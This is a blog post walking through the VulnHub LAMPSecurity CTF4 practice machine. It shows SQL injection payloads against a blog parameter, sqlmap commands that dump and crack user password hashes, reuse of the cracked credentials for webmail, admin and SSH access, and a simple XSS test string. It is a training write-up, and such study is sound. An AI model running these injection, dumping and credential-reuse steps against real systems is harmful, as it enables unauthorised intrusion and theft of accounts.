+++
title = "LAMP CTF4"
date = 2017-09-20
[image]
link = "/images/posts/lamp_ctf4/presentation.jpg"
copyright = "https://unsplash.com/@felexelix"
tags = ["technology", "ctf"]
+++

> Source: https://www.vulnhub.com/entry/lampsecurity-ctf4,83/

This LAMP challenge is most likely to be focused around casual Linux-Apache-MySQL-PHP vulnerabilities. Let's check the `robots.txt` file first:

```
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
```

## /mail/

Looks like a webmail service, we can't login for now, moving on.

## /restricted/

There's another service here, protected by a `.htaccess` file login, but we don't have any access, moving on.

## /conf/

This page crashes with a 500 error that gives two interesting pieces of information:

- The system is Fedora and is using `Apache/2.2.0`
- `dstevens@localhost` is the system admin of the website.

## /sql/

Following the link to the `db.sql` file, it looks like the database init script, to create tables inside the database `ehks`.

```sql
use ehks;
create table user (user_id int not null auto_increment primary key, user_name varchar(20) not null, user_pass varchar(32) not null);
create table blog (blog_id int primary key not null auto_increment, blog_title varchar(255), blog_body text, blog_date datetime not null);
create table comment (comment_id int not null auto_increment primary key, comment_title varchar (50), comment_body text, comment_author varchar(50), comment_url varchar(50), comment_date datetime not null);
```

## /admin/

This is a login page to what seems to be the admin section of the website, we don't have any access, moving on.

# Blog

We can find quite easily that the `id` parameter on the blog page is subject to SQL injections:

```
http://hostname/index.html?page=blog&title=Blog&id=2 or 1=1
```

Let's spin up `sqlmap` to verify that:

```shell
$ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2
...
[14:29:44] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
...
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=blog&title=Blog&id=2 AND 4573=4573

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: page=blog&title=Blog&id=2 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: page=blog&title=Blog&id=2 UNION ALL SELECT NULL,CONCAT(0x7176766a71,0x5977754a5070696d674d496c6b5054584d4655575261757651686750576e58664e7475695866544f,0x716b706271),NULL,NULL,NULL-- aReR
---
[14:29:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Fedora 5 (Bordeaux)
web application technology: Apache 2.2.0, PHP 5.1.2
back-end DBMS: MySQL >= 5.0.12
```

This confirms the vulnerability of the `id` parameter and also that we have the LAMP setup as expected.

Let's explore the database now, starting with the tables and columns in the database `ehks` (the one we found earlier):

```shell
$ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2 --dbms=MySQL -p id --columns -D ehks
...
Database: ehks
Table: blog
[5 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| blog_body  | text         |
| blog_date  | datetime     |
| blog_id    | int(11)      |
| blog_title | varchar(255) |
| user_id    | int(11)      |
+------------+--------------+

Database: ehks
Table: comment
[6 columns]
+----------------+-------------+
| Column         | Type        |
+----------------+-------------+
| comment_author | varchar(50) |
| comment_body   | text        |
| comment_date   | datetime    |
| comment_id     | int(11)     |
| comment_title  | varchar(50) |
| comment_url    | varchar(50) |
+----------------+-------------+

Database: ehks
Table: user
[3 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| user_id   | int(11)     |
| user_name | varchar(20) |
| user_pass | varchar(32) |
+-----------+-------------+
```

Sweet! now let's dump the user info and try to crack the passwords:

```shell
$ sqlmap --url=http://hostname/index.html\?page\=blog\&title\=Blog\&id\=2 --dbms=MySQL -p id -D ehks -T user --dump
...
[14:48:02] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
do you want to crack them via a dictionary-based attack? [Y/n/q] y
what dictionary do you want to use?
[1] default dictionary file '/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
do you want to use common password suffixes? (slow!) [y/N] n
...
Database: ehks
Table: user
[6 entries]
+---------+-----------+--------------------------------------------------+
| user_id | user_name | user_pass                                        |
+---------+-----------+--------------------------------------------------+
| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 2       | achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| 5       | sorzek    | e0a23947029316880c29e8533d8662a3 (convertible)   |
| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+---------+-----------+--------------------------------------------------+
```

Remember the `500` error previously? It mentioned the user `dstevens`, and we now have his password, great! 

We can go back to the previous services we found:

# /mail/ round 2

Using the `dstevens`/`ilike2surf` combination works. We can see a lot of security-related emails, mentioning the `sqlmap` execution we just did (not very stealthy!):

```
OSSEC HIDS Notification.
2017 Sep 19 14:29:26

Received From: ctf->/var/log/httpd/access_log
Rule: 31106 fired (level 12) -> "A web attack returned code 200 (success)."
Portion of the log(s):

XX.XX.XX.XX - - [19/Sep/2017:14:29:26 -0400] "GET
/index.html?page=blog&title=Blog%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&id=2
HTTP/1.1" 200 2982 "-" "sqlmap/1.0.9.32#dev (http://sqlmap.org)"

--END OF NOTIFICATION
```

# /admin/ round 2

The same login works here, it's the backend to the blog part of the website. We can create new blog posts with a title and a body. Nothing more to say apart from the fact that the fields won't protect against possible XSS. Posting 

```html
<script> alert(1) </script>
```

will lead to the script being executed.

# SSH

`dstevens` is most likely the admin of the machine, let's try to connect to the box, using SSH, with the same login found on the db:

```shell
$ ssh dstevens@hostname
dstevens@hostname's password:
Last login: Mon Mar  9 07:48:18 2009 from 192.168.0.50
[dstevens@ctf ~]$ cat /passwd
cat: /passwd: Permission denied
[dstevens@ctf ~]$ sudo cat /passwd
Password:
21fd958ecb671ca15bd7547077910147
```

Neat, it worked!
